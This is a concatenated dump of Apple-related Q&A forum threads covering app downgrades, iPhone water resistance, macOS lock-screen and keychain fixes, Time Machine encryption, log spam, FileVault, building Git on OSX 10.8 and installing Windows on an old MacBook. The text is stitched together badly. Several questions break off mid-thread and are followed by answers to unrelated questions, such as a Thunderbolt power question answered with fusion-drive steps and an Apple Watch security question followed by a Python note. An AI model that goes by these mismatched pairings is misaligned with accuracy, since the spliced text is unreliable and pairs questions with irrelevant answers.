(iBird Pro) I have iBird Pro on my old iPad and it has stopped working because I \"updated\" it and the new version requires an internet connection. Even with a connection it does not work and I just get Flickr ads, no pictures of birds.\nBefore it did not require an internet connection at all. So, basically my app has been ruined.\nIs there any way for me to go back to a previous version so I can see bird pictures again?\n\nA: Yes, assuming you have backups of your Mac/PC, the right version of iTunes (or some other software capable of syncing apps) and that the old version of iBird Pro still runs on the version of iOS you have on your iPad.\nEssentially what you would need to do is check what version of iBird Pro is stored with your iTunes Library on your Mac/PC (or within your Time Machine or other backups)? Basically you need to go back far enough in your backups to see whether you still have the old version:\n\n\n*\n\n*If so: you can select and sync the iBird Pro app from your iTunes library to your iPad.\n\n*If not, and you have a Mac: Your Time Machine backup should have backups of all the apps previously downloaded/synced with your iPad. These will be located within your iTunes Library. So you could go back far enough to find a version of the iBird Pro app that will work with your iPad and restore that version to your iTunes Library. Then select and sync that version to your iPad from within iTunes.\n\n*If not, and you have a PC: Assuming you have past backups of your iTunes Library, you can do the same as above (i.e. copy back a version of the iBird Pro app that will work with your iPad to your iTunes Library. Then select and sync that version to your iPad from within iTunes.\n\n\nIMPORTANT: \n\n\n*\n\n*You should read the following before proceeding, as Apple has recently changed whether iTunes can still do the above. In a nutshell you will need iTunes 12.6.3 or earlier if you're on a Mac, or you'll need to use 3rd party software such as iMazing. \n\n*You should delete the current version of the app from your iPad prior to syncing an old version across.\n", "Q: Does the iPhone 8 have any sort of water resistance or waterproof manufacturing? I recently got the iPhone 8. After some research, I found that it had the IP67 rating. I'm not sure what this means though especially for a steamy room.\nDoes this rating mean that it is fully waterproof, or is it only waterproof for a certain number of meters?\n\nA: The iPhone 8 and 8 Plus is not waterproof — no smartphone is and in a break with past iPhones, Apple now designs for an IP67 rating for dust and water-resistance. You can read more about how IP ratings work here.\nIn a nutshell, as far as water is concerned, an IP rating of 67 means your iPhone 8 can be fully submerged in up to 1 meter of water for up to 30 minutes without being damaged.\nSo, will an iPhone 8 die if it takes a brief dip in water that’s deeper than 1 metre? No. \nWill it survive for over a half hour or so in about 5cm (2\") of water? Yes. \nWhat this all means is that an iPhone 8 (that isn’t cracked or otherwise compromised) will survive a water accident that caused significant damage and function degradation to older iPhone hardware.\nSteam\nIn terms of steam, no, it's not officially rated against that criteria (from memory it'd need to have an IP rating of 69 for that).\nHowever, if you're just talking about leaving it on the bathroom bench while you have a shower, then it'll be fine1 assuming it's not going to be in there for a prolonged period of time and that the steam isn't produced from extremely high heat.\n1. Based on the fact I have two teenage daughters who have used iPods and iPhones like this for years (and they don't even have an IP rating)!\n", "Q: MacOS 10.13.4 Cannot turn off lock screen in system preferences I guess since up 'upgraded' to 10.13.4 I get a login screen if I leave my MacBook air alone for the briefest time.

If I could change it to 8 hrs I wouldn't be so unhappy, but as it is it is intolerable. Makes me want to go back to Linux. \nI live alone and I have never taken my MacBook to any place public. I guess Apple in their wisdom thinks that if I go to the kitchen to freshen my coffee someone will bust down the door and steel all my secrets. \nI would be glad to downgrade my OS if I could figure out how, and if that would actually make a difference. \nI hope someone has a solution for this, I'm at wits end.\n\nA: I was stumped with some issues for days now, reading everything I could on the subject, and I finally found the solution: it is a keychain problem with as simple solution.\nThe solution is to delete one or more folders located in ~/Library/Keychains/, that is to say folders in the Keychains folder in our user Library.\nThe folders to be deleted have long names like: A8F5E7B8-CEC1-4479-A7DF-F23CB076C8B8.\nYou may have one or more folders with these long names and they can be safely deleted: one such folder will be recreated after rebooting.\nDo not remove anything else contained in you Keychain folder, and reboot.\nOnce rebooted, reinstall all extensions in Safari, and/or enable other features you we having issues with.\nTrashing those folders solves many issues such as:\n\n\n*\n\n*Security login screen system prefs not recognizing your changes & your password (locks the screen immediately on sleep or screen saver);\n\n*Safari disabling all your extensions and not recognizing your password if you try a solution in the developer's menu;\n\n*iCloud system prefs not wanting to enable your iCloud Keychain and complaining it can't communicate with the iCloud server;\n\n*Safari not recognizing your password when you try to access the passwords tab in Safari preferences;\n\n*Login screen disregards Automatic Login settings and insists on asking  for a user password.\n——\nI found this solution at TechRaptor (thanks!), although at first it seems a bit unrelated (many screen captures in article): The Iron Mac: How to Get Rid of Annoying Local Items Keychain Box.\n\nA: Well, this isn't exactly an answer to the original question, but it is a workaround. I set up a new admin user with a slightly modified version of my real name (still real, but included an initial I didn't include before). New 'short name', 3 initials instead of two. I miss my old user short name. I've been jr ever since PDP11 and ATT Unix PC days. Oh well. Anyhow, the new jrv account works like it should, but the other one still doesn't work. \nIn a way, it wouldn't be bad to abandon the not completely functional account, since it has a lot of detritus accumulated over the years. On the other hand, it is taking quite some time to get my dropbox folder installed on the new account. I wonder how hard it will be to get my Xcode going with my developer credentials (new to this). \n\nA: i was having the exact same problem. to fix it simply change the password.from there you will be asked if you want to use a separate password. choose yes and change, once done change back to the original password. after your iCloud might ask you to sign in again. once that is done you should be able to turn off screen lock. \n\nA: This is more indicative of the System Preferences .plist file being corrupt.\nWhilst in Finder click on Go in the menubar, click Go To Folder and enter the following path,\n~/Library/Preferences/com.apple.systempreferences.plist click Go.\nA new Finder window will open with the file highlighted, move it to the Desktop.\nRestart the Mac, a new systempreferences.plist will be generated.\nWhen the Mac starts try changing your preferences in System Preferences> Privacy & Security> General\nif the problem is now solved, great, you can delete the original .plist on your Desktop.\n", "Q: Refurbished Mac: Can you keep old software after time machine restore? I've bought a refurbished MacBook Pro (early 2013). \nMy original one (early 2011) keeps shutting down, so took to repairman who reflowed the logic board (cost 170, didn't work) so payed another150 for him to tinker with it and it came back worse than before, now instead of just turning off it freezes and gives me vertical grey line and repeats the last sound the video I was watching over and ob=ver.\nAnyway....... I bought a refurbished one as said, and it has Microsoft 2016. The original Mac has 2010, so I was wondering if there was a way of using time machine to restore (if thats the right word) my old system to the new Mac but keep Microsoft 2016.\nThanks in advance\n\nA: I assume the 'new' Mac isn't brand new, since new Macs don't come with MS Office pre-installed? Time Machine won't let you do such a selective restore anyway, but in that case the only way to legally keep the copy of 2016 you've acquired is to have its license transferred to you. That will likely involve contacting both the original owner and Microsoft, after which you can install 2016 whenever you like.\nSee also: https://superuser.com/a/1150086\n", "Q: What's the maximum power delivery in Macbook Pro 2016, 2017 Thunderbolt 3 ports?

Only solution is to erase fusion drive, install 10.13.4 and then restore apps and data using the migration assistant.\nThis is not for the light hearted, but it worked. See http://www.wiredbob.com/2013/12/clean-installation-of-fusion-drive.html\n(The secret to success was booting from my MtnLion8.3ESD USB stick, deleting the fusion drive, then re-creating the \"Macintosh HD\" fusion drive, installing 10.13.4 clean, and then the magic of Time Machine/Migration Assistant. )\n", "Q: Apple Watch 2/FaceTime is possibly hacked? I received what appears to be a malicious message on my Apple Watch 2.  It did not arrive via any known messaging app.  There was no banner, only the words.  The words were threatening.

Then I went on my MacBook Air and a box popped up: \"Your Apple ID and phone number are now being used for FaceTime on a new Apple Watch\".  My Apple Watch is not a new Apple Watch. so I'm a bit alarmed.  Any advice?\n\nA: That is not any threat. I think you signed into FaceTime on your Apple Watch using your Apple ID. So all your other apple devices will notify you. But your device doesn't know whether your Apple Watch is new or old. Even I got that message on my MacBook after signing in into FaceTime on my iPad.

I prefer the Anaconda version as it allows me to easily install Jupyter and they look after these sort of compatibility problems well.\n\nA: You need to make sure which version you are running. Just type python on the command line, without a filename, and see what happens. Look at the output to see which version is running.  If there is no output, it's probably a problem with your path.

The only way I have found to find a redirected email item is to look for the little -> icon on the left of each message so redirected.  Is there a way to set a rule looking for that in a smart mailbox?  And if not, has anyone requested that feature?  Thanks.  Boyd\n\nA: Unfortunately the Smart Mailbox criteria doesn't include a way to search all email headers, because only a portion of them is actually indexed in the Spotlight database. However, you can make a workaround by combining mail rules and existing smart mailbox criteria. The goal is to use one of the indexed criteria such as a flag colour you don't use anywhere else and have mail rule evaluation set that flag on messages that are resent.\nCreate a new email rule in Mail/Preferences/Rules/Add Rule. Open the conditions popup and you will see many more compared to Smart Mailbox. However, Resent-From is not there, but we can fix that by choosing Edit header list..., adding a Resent-From and selecting it.\n\nType your email address as I assume you are interested in email messages that you redirected, right? As the action taken simply flag your message what a colour you selected.\n\nThe final step is creating a smart mailbox using the flag as the search criteria.\n\nThe end effect is that whenever you redirect an email message, the flag gets applied automatically and it shows up in the smart mailbox.\n\nA: I think boris42's answer is better than mine because it is strictly looking for the \"Resent-From\" header.\nI'm lazy so my solution is to use the \"Any recipient\" header for the smart mailbox.\n\nAny recipient is equal to Mailboxredirectingemails@emailaddress.com\n\n", "Q: My iPhone 6 has a problem charging My iPhone 6 has a problem charging it will charge then not charge then it will repeat it.

I took my phone in for a new battery.\n\nA: You have an iPhone 6, which means you can be updated to the latest iOS version. The latest has a battery health indicator in your battery settings.

Although it has write drivers installed, which can be activated via the command line following this set of instructions, this is complicated. Most users install a third-party driver such as OSX Fuse or Tuxera to write to NTFS. The only file systems that natively support read and write on MacOS, Windows, and Linux are ExFAT and FAT32.\n\nA: MacOS does not allow the user to write to NTFS formatted disks.

If you do not remember setting that password, you have a few options:\n1) If you bought your computer directly from Apple, they can remove the firmware lock for you.\nIn this case, you can go to the nearest Apple Store or Apple Authorized Support center and they can remove the firmware key. Before you do that, it’s a good idea to backup your data from both macOS and Windows partitions. You can use TransMac to access macOS partitions from Windows. You will also need to provide proof of ownership of the Mac which has a locked firmware password in order for them to unlock the computer.\n2) If you bought it online from someone else (i.e from Amazon)\nYou will have to contact the seller and ask him/her the firmware password. He/She can tell it to you and you can then remove the firmware password from Recovery Mode.\nWay to boot into macOS without firmware password (Requires macOS Sierra or earlier)\nGo into Bootcamp Helper control panel and there should be an option to select between OS X and Windows. Select OS X and press Reboot (or save and restart).\nSource: http://osxdaily.com/2015/01/28/forgot-mac-firmware-password-what-now/\n\nA: Your description is rather confused, but the the image you posted looks like a firmware password prompt (see Apple's support document #HT204455). If there's a firmware password set on your Mac, you'll need to enter it in order to invoke any alternate startup mode -- basically, anytime you hold keys down at startup to make the Mac do something other than the default startup.\nDo you know the firmware password? If so, just enter it and proceed normally. If not, you have a problem, because it's (intentionally) hard to remove or change if you don't know it.\nYou may also be able to switch between macOS and Windows using the Startup Disk preferences (in macOS) and Boot Camp control panel (in Windows). However, as @ÖmerRıfatKuldaşlı pointed out in a comment (and this Apple support document agrees), the Boot Camp control panel doesn't support switching to APFS volumes (which High Sierra uses on SSDs). So if you have an SSD MacBook Pro and High Sierra, you'll need the firmware password to switch from Windows to macOS.\n", "Q: Can I put my HD into an enclosure boot into it and expect all my apps / programmes to run? I’ve got to send my laptop, MBP mid 2012, running OSX 10.10, into a repair shop.\nI use the computer for work so can’t really be without it. Could I take 5e HD out (this is one of the old MBPs with a removable HD), put it into an enclosure and 5en boot into it to work in from a Mac mini which is currently running 10.13 although I believe it had 10.10 on there at some point so the drivers should be there. \nWould booting into the HD cause any issues with email accounts (imap accessed via Mac mail), Dropbox sync app, and other pieces of bought software that require a serial number ?\nI also have file vault enabled on the drive but presumably as long as I know the password I can still boot into it.\n\nA: The nice thing about macOS is that, so long as the machine you're transferring the drive to is old enough to recognise the OS on it [which it sounds like yours is], it will boot - & you wouldn't even know you'd changed machines.\nI migrated my Mac Pro 3,1 to a 5,1 by simply doing that - swap the drive to the new machine. Done.\n\nA: In a word yes.\nAs long as your Mac supports booting from USB (and I believe yours does) this is possible and practical to do.\nGenerally USB will be slower than your internal drive but it should still boot and allow access to all your apps. Just use a good imaging tool like CCC or SuperDuper to get a faithful copy and test it before you wipe the internal.\n", "Q: How to delete /var/run/com.cyberghostsrl.CyberghostPrivilegedHelper.socket? how can I delete this file?\nif I run netstat -an this gets listed\n/var/run/com.cyberghostsrl.CyberghostPrivilegedHelper.socket\n\nit is probably an old installation of cyberghost, but I realy think that this is shady that it is not uninstalled.\nI already tried:\nsudo rm -rf /var/run/com.cyberghostsrl.CyberghostPrivilegedHelper.socket\n\nin safeboot mode, but it doesn't get deleted.\nWhat I can see that this only shows up in non safe mode.\n\nA: The \"file\" (the name suggests it's actually a socket) is probably getting recreated by cyberghost every time the computer starts up. If you want to get rid of it, you need to completely remove cyberghost. I'm not familiar with cyberghost, but it may install some files besides the app itself, that you'll have to track down and remove.\nThere are some uninstall guides online that're fairly generic, but should give you the info you need to find & remove the relevant files. One thing that might be missing from a generic guide is removing launch daemons and agents: You'll need to look for related files in the folders /Library/LaunchDaemons, /Library/LaunchAgents, and (inside your home folder) ~/Library/LaunchAgents.\n", "Q: How can I prevent Keynote from storing files in iCloud?

I have thought about turning iCloud off, but I don't mind having system prefs saving stuff there - just not my voluminous workfiles that I share via DropBox instead.\nHow do I stop this happening?\n\nA: Go to System Preferences > iCloud > iCloud Drive and click on the Options... button.\nIn the Documents section, uncheck the Keynote.app (and any other app you don't want) to stop it from saving in iCloud:\n\n", "Q: signpost_notificationd is flooding error log with błąd \"0 is not a valid connection ID\" I recently noticed that my error log is being literally flooded with \"0 is not a valid connection ID\" generated by signpost_notificationd process. The message is being logged few times per second.\nHow can I check what is causing this?\n\nA: MacBookPro 2017 / MacBookPro14,3\nI was getting this issue on reboot along with the high kernal_task usage. I went through the console killing of the noisiest processes and sure enough, signpost was one of them. Soon as I did, my kernal_task process dropped back to normal. It has been running at > 600%.\nsudo ps aux | grep -E '^root.*signpost_notificationd' | awk '{system(\"sudo kill -9 \" $2)}'\n\n\nA: so this seems to be a bug in 10.13.3 or 4 - if you force-quit the signpost_notificationd process in Activity Monitor it will fix the issue until the next reboot. Note that since this is a system process, it will immediately restart, but it seems to fix the logging problem (and whatever the underlying issue is).\nA lot of discussion about it here: https://discussions.apple.com/thread/8291112\n\nA: This is part of signpost_reporter system which sends telemetry to Apple if you opt in to sharing crash reports and other diagnostic / usage information.\nOn the vast majority of our Macs - this error does get logged quite often and is harmless in that we get 0.0% CPU time even after the Macs are running for 20 to 40 days without a restart.\nUnless you want to change your opt in for crash data or are seeing high CPU usage, you can probably safely ignore these errors and filter them out. Yes it's an \"error\" but it's not one that seems to be problematic for anyone using the system - just for processing them out of the console app or log files if you want to see other messages.\n\nA: As a note for everyone interested or experiencing this issue - updating to 11.13.5 resolved the problem for me.

How exactly would someone get into my Mac if it weren't encrypted, since I already have a password on it? \n\nA: Every file is protected by permissions. Permissions are like laws: You can choose to follow them or not. Files are like property.\nLaws:\n\n\n*\n\n*John owns this file and controls who and what people can do \n\n*Bob, Johns friend,  can Read this file but can't Write to this file\n\n*Sam, Johns colleague, can read and write to this file\n\n*Everyone else is unable to read or write to this file\n\n\nNote:  You can see these permissions by selecting a file and pressing CMD + I. Under \"Sharing & Permission\" there is a list of users and there corresponding permissions.\nIt is up to the operating system/user to follow these laws (permissions).  \nJack, Johns enemy, can look at the file and see that he does not have permission by John, the owner, to view this file.  Jack is a bad guy and decides that he is going to look at the file anyway.\nJack can do this extremely easily by booting onto a flashdrive/external drive and following this guide: https://larryjordan.com/articles/mac-os-set-hard-drive-permissions/ or some many other various ways including booting from an external drive.\nScenario 1: The File is not Encrypted\nJack views the file and steals all the information on it.\nScenario 2: The File is Encrypted\nJack tries to view the file but the file is unreadable because it is encrypted. Jack yells \"DARN!\" in frustration and continues on to his next victim.\nScenario 3: The File is Encrypted but John Uses an easy to guess password\nJack tries to view the file but the files is unreadable because it is encrypted. He decides to see if he can guess John's password and guesses \"John123\". Jack is correct and unencrypted the file. He yells \"Stupid John\" and steals all the information on it.\nMoral of the story:\nPermissions are like laws.  Most law abiding operating systems and users will...well..abide by these laws. But some criminals (hackers or your average Joe) can very easily ignore these permissions.  To prevent these people from accessing your information you have to encrypt the file with a strong password, otherwise the criminals can guess/brute force/hack the password and access your data.\nFireVault encrypts your entire disk. I would suggest keeping it on if you have any important information on your disk.\n\nA: The same way that anyone could get into any computer not knowing the username and password. Windows, Linux, macOS it's all the same from that perspective.\nIm not being facetious here. If you have physical access to a computer there are lots of methods and hacker tools that will let you gain access to the computer.\nAnd if the computer is taken it is a simple procedure to extract the HD/SSD and attach it to another computer, voila! complete access to the filesystem.\nReally what most physical security is for is to keep casual users out of your system. A really knowledgable InfoSec pro with unlimited funds and access to high level hacking tools (governments, mostly...) can get into anything, it just depends on how valuable the info on your computer is to the presumed thief/hacker.\nIf you are a typical user with no state, or highly classified/illegal, info on your computer then your info is fairly safe behind your username and password. Only you can decide how much annoyance (EG passwords, encryption, etc.) you are willing to put up with to protect your data from slightly more than casual users and/or thieves that are likely to get their hands on your computer.\n", "Q: Looking to increase my iMac's RAM I am looking to increase the RAM of my iMac (Retina 5K, 27-inch, Mid 2015).

I have to do something similar so my brew-installed apache doesn't get disrupted by the system's apache.\n\nA: Yes. Changing port is as simple as running it with a command line override:\nselenium-server -port 4455\n\nThe above would try listening on port 4455 instead of 4444\nChanging launchd is a little more work since you need to locate the exact file on the filesystem that it got the directions to listen on 4444. \nHere is a nice write up of one such way to configure selenium to use port 4444\n\n\n*\n\n*https://github.com/shvets/selenium\nSo, you’d need to edit the plist that controls the launch.

I have a small airplane which provides 14V (volts) through a cigarette lighter socket. Can I use this to charge an iPad?\n\nA: Yes, but you have to check the input range of the adapter.\nDC voltages in a car can vary between 10V (at rest) and 16V (charging).   Most USB chargers you buy can handle this variance.\nHowever, there are some applications where the voltage can be (much) higher like aviation, trucking, and marine where the voltages can reach up to 24 volts.\nThis is where paying attention to the specifications and buying high quality is very important. Here are two high quality ones that I personally use \n\n\n*\n\n*Scosche Dual ReVolt - Up to 16V\n\n*Anker PowerDrive Speed 2 Ports - Up to 24V\n\n\nI use the Scoshe mostly because it's low profile and I can close the ash tray door with it still plugged in (though it always gets \"appropriated\" by someone else). \n", "Q: Not able to connect an external acer display to MacBook Pro 2015 Here is the info of my laptop: \n - MacBook Pro (Retina, 13-inch, Early 2015) \n - 3.1 GHz Intel Core i7 \n - 16 GB 1867 MHz DDR3 \n - Intel Iris Graphics 6100 1536 MB \n - macOS High Sierra version 10.13.4\n - Acer G236HL Bbd 23-Inch Screen LED-Lit Monitor\nI've tried both a SMC reset and NVRAM reset and nothing worked for me.\nI am so frustrated with this issue. \nHow do I troubleshoot this issue:\n\n\n*\n\n*I used the same Thunderbolt cable and a new MacBook Pro and connected to TV - WORKED\n\n*I connected the Cable and my Acer monitor with OLD MacBook Pro 2012 - WORKED\n\n*I connected the MacBook Pro 2015 and same cable and Acer monitor - Not working.\nThat means the port is working fine with new MacBook Pro.\nCable is working fine.\nMonitor is working fine.\nThe big issue is not being able to detect the display on the MacBook Pro 2015. \nI'm not sure what else I need to do. \nDoes anyone have a solution for this issue?\nI tried calling Apple Customer Service and they are clueless.\n\nA: If the external screen is flickering and blacking out after 3-5 sec, try going into System Preferences > Displays and change the settings for your external monitor.

I will accept a 25 to 50% degrade in performance,\nbut not a 10x blowup in time to completion.\n\n\nI have an 4 TB external hard drive, and I would like to use Time Machine on it to backup my 1 TB MacBook Pro (with SSD). The backups will happen manually every couple of weeks or so. Let me stress that leaving the external disk plugged in at all times is not an option.\nApparently I have a few options:\n\n\n*\n\n*Normal hard drive, click on \"Use Encryption\" when connected with Time\nMachine. (configuration I had until now). Seems way too slow; also,\nevery time I connect it I have to wait for ages until the drive is\ndecrypted and I can actually use whatever is on disk. Way too slow.\n\n*Format the drive and use Mac OS Journaled Extended, Encrypted.\nThis will encrypt the whole drive, as I understand it. But will it be\nfaster than option 1)? How do the encryption of 1) and 2) work\ntogether? I am quite confused at this point.\n\n*The third option is to format the drive, use MacOS Journaled Extended\n(not encrypted) and just use time machine without encryption.\n\n\nBackstory\nThe first time I connected it to TimeMachine, it asked me if I wanted to encrypt the data. I thought \"Sure, why not\" and agreed. I waited for ages the first time (as it had to back up tons of data). A couple of weeks later I come back to backup again; this time it was about 20 Gb of data. It again took ages, and most of the time it was stuck on encryption.\nI left it on the whole night, and the morning it was still encrypting (probably something went wrong in this particular case though, as it was 56% at 23:00 and 57% at 09:00 in the morning). But anyway it takes several hours for the decryption process, then there's the actual backup, and then several hours again for the encryption process. Honestly, I cannot have backups taking a whole day. I need to plug it in, wait 3-4 hours, then go on with my life. If I can do this with encryption, good. Otherwise I will have to remove encryption.\n\nA: Mac OS Journaled Extended, Encrypted\nI have external Time Machine drives formatted as Mac OS Journaled Extended, Encrypted. The encryption is fast enough not to be significant.\nWith this set-up, I have not experienced any problems or unacceptable back-up times. I too disconnect drives between back-ups.\nFormatting and Mounting\nFormat the external drive using an encrypted format. This will ensure the whole disk is encrypted. Time Machine thus is no longer involved in the encryption process.\nOn connecting the drive, macOS will ask for the drive's passphrase. You can choose to remember the passphrase in your Keychain.\nEncrypting\nIf Time Machine is handling the encryption, you will see a Sparse Disk Image Bundle in your external drive. This disk image file will be named after your computer.\nIf FileVault is handling the encryption, you will see a folder called Backups.backupdb in your external drive. This folder will contain a folder with the name of your computer.\nYou want the second, FileVault to transparently handle the encryption.\n", "Q: MacBook Air shuts down on fully charged, healthy battery I have a MacBook Air 13\" High Sierra, early 2015.

I made an attempt to find it and was unable.\nYesterday, I ran the most recent HighSierra update on my Late 2009 iMac. This computer has three separate user accounts, I am the only one who has an AppleID and I am also the admin. My mother was the one who initiated the update; from her user account on said computer. \nWhen the updates were finished, she was the first to try and use the computer, being that she does not have an AppleID or admin privileges, I came over and did the seemingly usual sign-in process. However, I was unwittingly signing my iCloud and all that goes with it into her user. \nI do not want all those things signed into her user, because she now has access to my iMessages, my emails and other things. As a temporary fix, I went into her Mail app and edited my iCloud mail setting so that that would not be coming into her inbox, I also went into System Preferences and turned off most of the iCloud services (contact syncing, notes etc).\nHowever, the above was just a temporary fix, how do I get this reset so that my iCloud is only signed into my user and my mother does not have access to my emails and such?  \n\nA: Just sign out of iCloud and your Apple ID. \n\n\n*\n\n*Go to the System Preferences>iCloud>Sign Out\n\n*Go to the App Store>Store>Sign Out\n\n*Go iTunes>Account>Sign Out\n\n\nThat should log you of everything associating your Apple ID with that user.\nFor more Info:\nSigning out of iCloud: https://support.apple.com/en-us/HT208242\nSigning out of iTunes: https://support.apple.com/kb/PH19633?locale=en_US\nSigning out of App Store: How do you log out of the Mac App Store?\n", "Q: How to reinstall macOS? I have only Ubuntu 16.04 (no Partitions) running on my MacBook (My model is A1181) but I would like to install macOS, replacing Ubuntu. How should I go about doing this?\n\nA: Boot your Mac holding down the Command and r keys. This should get you into Recovery Mode.\nFirst get into disk Utility and delete the Ubuntu partition and format it as macOS Journaled HFS+. Once that is done quit out of disk utility and click on Reinstall MacOS.\nIt will connect to your network via WiFi (so if you can do ethernet, it will go faster) asking you for your WiFi password and proceed to install the version of macOS that your Mac came with.\nOnce macOS is installed you can log into the mac and then into the App Store and pick a later version of macOS that you want on your Mac if the one that was installed is not as up to date as you like.\n\nA: Mac OS X Lion is the last supported release for your MacBook. To get started, you will need to obtain a copy of Mac OS X Lion if you don't have it already. You can order one here. Or you can obtain a USB key with the Mac OS X installer pre-loaded.\nYou can follow the instructions in the Apple support document, How to create a bootable installer for macOS to create a bootable USB key installer. (You'll need a working Mac to do so)\nNow, assuming you have bootable key ready, restart your MacBook and hold Option key. Select the USB drive as the startup disk. Now you can follow the on-screen instructions to wipe the internal drive and install Mac OS X Lion.\n", "Q: Disable 'allow permission to send push notification' in Safari 11.1 Even though the option of \"Allow websites to ask permission to send push notifications\" is unchecked, I get alert in websites asking for permissions.

When I open the App Store and attempt to update my apps which need updating, I am prompted to sign in to my apple account. However, it's prompting me to sign into foo@yahoo.com without giving me the option of changing that ID.\nAbout a year ago, I modified my account to use a different email address, foo@gmail.com. It's the same account - just with an updated ID. How can I modify the ID within the app store?\n\n\nA: If you have originally downloaded the apps while logged in with your old Apple ID, than to update it will ask old Apple ID and password. To fix this issue, delete the installed app, login with your current Apple ID and download the app again. This would solve the problem.\n", "Q: Maps : search directions with intermediate point? On MacOS as well as iOS : is it possible to search directions including an intermediate point (\"via\") ? Google Maps can do it.\n\nA: This feature is fully supported in iOS 16 and macOS 13.\nYou can set multiple stops at the beginning, and at any point during navigation you can add a stop between your current location and your next stop.\n\nA: Yes, you can do so in macOS/iOS Apple Maps. For macOS 13 (Ventura) and iOS 16, support for intermediate waypoints is built right into the Maps apps. When you're getting directions to a destination, there's a \"+ Add Stop\" option onscreen right under the selected destination. See Apple's online instructions for more information.\nFor earlier versions of the OS's, but you can only add intermediate waypoints in certain ways for. Specifically for macOS 12 and iOS 15 and possibly earlier versions, you must have already started navigation to a destination. At that point, you can add pit stops along the way. Once you've reached a pit stop — an intermediate waypoint — you can then add another. You can keep doing so until you reach the final destination.\nOnce you've entered the Navigation view, you can either touch/tap the screen (if you're not driving) or use Siri to add intermediate waypoints.\nVia the screen: swipe up from the bottom, choose an intermediate waypoint category from the offered list (things like coffee shops, gas stations, etc.), and then tap \"GO\" on one of the specific locations. The location will be added as an intermediate destination on the way to your original final destination.\nAlternatively, you can use Siri to add an intermediate destination. While in the navigation mode, engage Siri with \"Hey Siri.\" Then tell Siri to \"add a gas station\" (or other type of location). Siri will present you with some options and allow you to choose among them with your voice. Once you've chosen location, tell Siri you want directions and Siri will add it as an intermediate destination on the way to your original final destination.\nThis link has some good details on the topic: https://ios.gadgethacks.com/how-to/apple-maps-101-add-multiple-destinations-your-directions-0181465/\n", "Q: Install Git on OSX 10.8 ALL,\nMy project is located on GitHub which recently switched to using TLS1.2, which is incompatible with the OpenSSL version OSX 10.8 ships with.\nSo I tried to build Git from sources.\nI downloaded the archive, unpack it and created config.mak file where I put following:\nNO_GETTEXT=Yes\nNO_OPENSSL=Yes\n\nThe build finished successfully, but when I tried to run it I still received:\nMyMac:dbhandler igorkorot$ /Users/igorkorot/git-2.17.0/git pull\nfatal: unable to access 'https://github.com/oneeyeman1/dbhandler.git/': error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version\n\nIs there an easy way to check what version of OpenSSL will be linked if I remove the line NO_OPENSSL=YES from the config.mak file? I will try to remove that line and do make clean && make after that. I did update whatever the notification was suggesting, but don't know if OpenSSL was part of the update.\nI just need the latest version of the library. Hopefully there is still one available for OSX 10.8.\nThe machine is old and I don't want to install anything extra (homebrew or such) unless absolutely necessary.\nTIA!\n\nA: I had Homebrew installed already, so these four steps were enough:\n\n\n*\n\n*brew install openssl\n\n*brew install git\n\n*mv /usr/bin/git /usr/bin/git.old\n\n*Add [http] sslVersion = tlsv1.2 to $HOME/.gitconfig\nNote that you need to install new openssl before building new git, otherwise it will link against the old system version of openssl.\n", "Q: Mid 2010 Mac Pro 5.1 Drive Is Failing It still works but am afraid it will unexpectedly die. I bought a new drive that's compatible but don't know how to transfer data from old to new after I install the new drive. \nCan I use Time Machine, Disk Utilities or what?\nThe old drive is Sierra 10.13.4 and the new drive is formatted with Sierra 10.12. \n\nA: First (after installing the new HD) you'll need to install macOS on the new drive. You can use internet recovery (boot with CMD+OPT+R) or make an install USB.\nIf you have an external hard drive available you can use Time Machine to create a back up and then restore that backup to your new machine.\nIf you don't have an external hard drive you could upload your files to iCloud or another online service and restore them later.\nAnother option is to purchase a SATA to USB adapter (such as this) and either use Migration Assistant or simply copy the files you'd like manually.\n\nA: Carbon Copy Cloner\nOn a Mac Pro, this is a no-brainer.\nDrop new drive into a spare slot.\nFormat & partition.\nClone - including recovery partition, which it will ask to add.\nRemove old drive.\nContinue as though nothing had happened.\n[The trick is actually to rename your old drive right before you clone, then name your new drive the same as your old one was.]\nPartitions can be any size, so long as the new one is large enough to fit all you data.\n", "Q: Expected incremental backup performance on Mid-2015 MacBook Pro I use Acronis True Image backup software on a new mid-2015 MacBook Pro Retina with a 2.8GHz processor and a 1TB SSD running High Sierra and APFS.  Incremental backups, even when there's almost no files that are changed on my system, take about 30 minutes to scan ~300GB.  Almost all of this is scanning time to look for changes.  Activity Monitor's Energy tab reports Energy Impact of about 150. \nIs this normal?  Seems like a long time and a lot of battery expenditure (if I enabled backups while not plugged in) for a disk scan.\nAlso, are there other less battery-intensive backup software for Macs?  Or should I realistically expect any backup system to be a time and resource hog because a full disk scan is inherently energy-intensive and time-consuming?\nFinally, is there anything I can do (other than removing files from my disk or excluding them from backups!) to improve backup times and/or energy cost?\n\nA: With those sorts of times it would appear that Acronis does a brute-force scan of the whole filesystem comparing each file.\nBut since 10.7 (Lion) macOS provides a mechanism called FSEvents that allows an app to be notified about changes so it can do its job in a much more efficient way. Time Machine uses FSEvents.\nSo, to answer your question: Your times are about right for software that is doing the scan inefficiently. As a Time Machine user I see far shorter times for much more data (600GB on SSD to external 1TB HDD over Thunderbolt) using my 3GHz i7 MacBook Pro (Retina, 13-inch, Early 2013) running High Sierra and APFS.\nMy recommendation is that you change software to one that is more modern in its approach.\nPS: Time Machine would backup your old Mac and restore to a new Mac, though it does it using its usual loose files approach rather than a single monolithic image. It would also only backup changes to your Parallels VM – no such luck for a VMware Fusion user like myself.\n", "Q: Install Windows 10 or 8.1 on MacBook 4,1 I need some help getting Windows up and running on my Early 2008 Macbook. \nIt does have a weird set up, but I think it's possible. All I have is a 16gb SanDisk USB drive. So, here goes. \nI was trying to use bootcamp to install Windows but I partitioned the disk wrong and deleted my partition for OS X. I tried all the shortcuts, but nothing worked. \nI finally used Startup Disk Creator on a Dell laptop running Ubuntu and got Ubuntu 17.10 running on it using the SanDisk. All is well, but I don't necessarily like Ubuntu, and I didn't really like OS X that much. \nI want to use the Sandisk and get either Windows 10 or Windows 8.1 running. You have to remember that while the computer is 64-bit, it has a 32-bit EFI. \nHere are my specs: MacBook, 4GB Ram, 2.4 GHz Core 2 Duo, 160GB HDD, Ubuntu 17.10 LTS\nI hope you guys can help me do this. Also, please don't hate or say \"Upgrade\" because, simply put, I can't as of now. \n\nA: I don't have personal experience with this but here's my best guess at the process\n\n\n*\n\n*Get a 32-bit Windows 10 .iso. You can download straight from MS.\n\n*Use unetbootin or similar to create a bootable installer. Format for FAT32 under MBR (Master Boot Record)\n\n*You should now be able to boot to the Windows installer and install from there.\n\n\nIt should be 